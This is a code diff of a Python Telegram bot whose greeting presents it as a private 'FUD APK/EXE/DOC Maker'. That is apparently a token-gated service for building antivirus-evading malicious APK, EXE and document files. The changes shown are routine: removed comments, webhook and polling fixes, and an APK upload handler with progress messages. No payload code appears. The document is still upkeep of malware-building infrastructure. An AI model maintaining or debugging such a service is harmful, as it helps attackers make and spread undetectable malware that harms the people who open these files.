@@ -646,24 +646,21 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     user_id = str(user.id)
 
-    # Only ADMIN_CHAT_ID gets admin panel
     if is_admin(user_id):
         context.user_data['is_admin'] = True
         await show_admin_menu(update, context)
         return
 
-    # Check token for non-admin
     token = context.user_data.get('token')
     if token and validate_token(token):
         await show_main_menu(update, context)
         return
 
-    # No token — show contact developer message
     keyboard = [[get_cancel_button()]]
     await update.message.reply_text(
         "🔐 FUD APK/EXE/DOC Maker\n\n"
         "This bot is private. Access requires a valid token.\n\n"
-        "👨‍💻 Contact developer:\n @benji_v1\n\n"
+        "👨‍💻 Contact developer:\n@benji_v1\n\n"
         "If you have a token, send it now.\n"
         "For instructions, type /help",
         reply_markup=InlineKeyboardMarkup(keyboard),
@@ -799,7 +796,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     data = query.data
 
-    # Cancel button — anywhere
     if data == "cancel":
         context.user_data.clear()
         await query.edit_message_text("❌ Cancelled. Send /start to begin.", parse_mode='Markdown')
@@ -992,7 +988,6 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     file_obj = await context.bot.get_file(doc.file_id)
     await file_obj.download_to_drive(apk_path)
 
-    # Progress callback
     async def update_progress(text):
         try:
             await status_msg.edit_text(f"📦 Processing APK...\n\n{text}", parse_mode='Markdown')
@@ -1302,7 +1297,7 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("❌ Cancelled. Send /start to begin.", parse_mode='Markdown')
     return ConversationHandler.END
 
-# ============ BOT RUNNER ============
+# ============ BOT RUNNER — FIXED CONFLICT ============
 def run_bot():
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
@@ -1315,8 +1310,10 @@ def run_bot():
         print(f"📢 Channel: {'Configured' if CHANNEL_ID else 'Not set'}")
         print(f"👑 Admin ID: {ADMIN_CHAT_ID}")
 
+        # ✅ FIX: Create application
         application = Application.builder().token(BOT_TOKEN).build()
 
+        # Add handlers
         conv = ConversationHandler(
             entry_points=[
                 CommandHandler('start', start),
@@ -1338,19 +1335,27 @@ def run_bot():
         application.add_handler(conv)
         application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_channel_post))
 
-        # Delete webhook before polling
+        # ✅ FIX: Delete webhook and wait
+        print("🔄 Deleting webhook...")
         await application.bot.delete_webhook()
+        await asyncio.sleep(1)  # Wait for webhook to clear
         print("✅ Webhook deleted.")
 
-        print("🤖 Bot ready, polling...")
+        # ✅ FIX: Initialize and start with drop_pending_updates
+        print("🤖 Starting bot polling...")
         await application.initialize()
         await application.start()
 
-        # Drop pending updates
-        await application.updater.start_polling(drop_pending_updates=True)
+        await application.updater.start_polling(
+            drop_pending_updates=True,
+            allowed_updates=['message', 'callback_query']
+        )
 
+        print("✅ Bot is running!")
+
+        # ✅ FIX: Keep running with reconnect on conflict
         while True:
-            await asyncio.sleep(1)
+            await asyncio.sleep(5)
 
     try:
         loop.run_until_complete(bot_main())
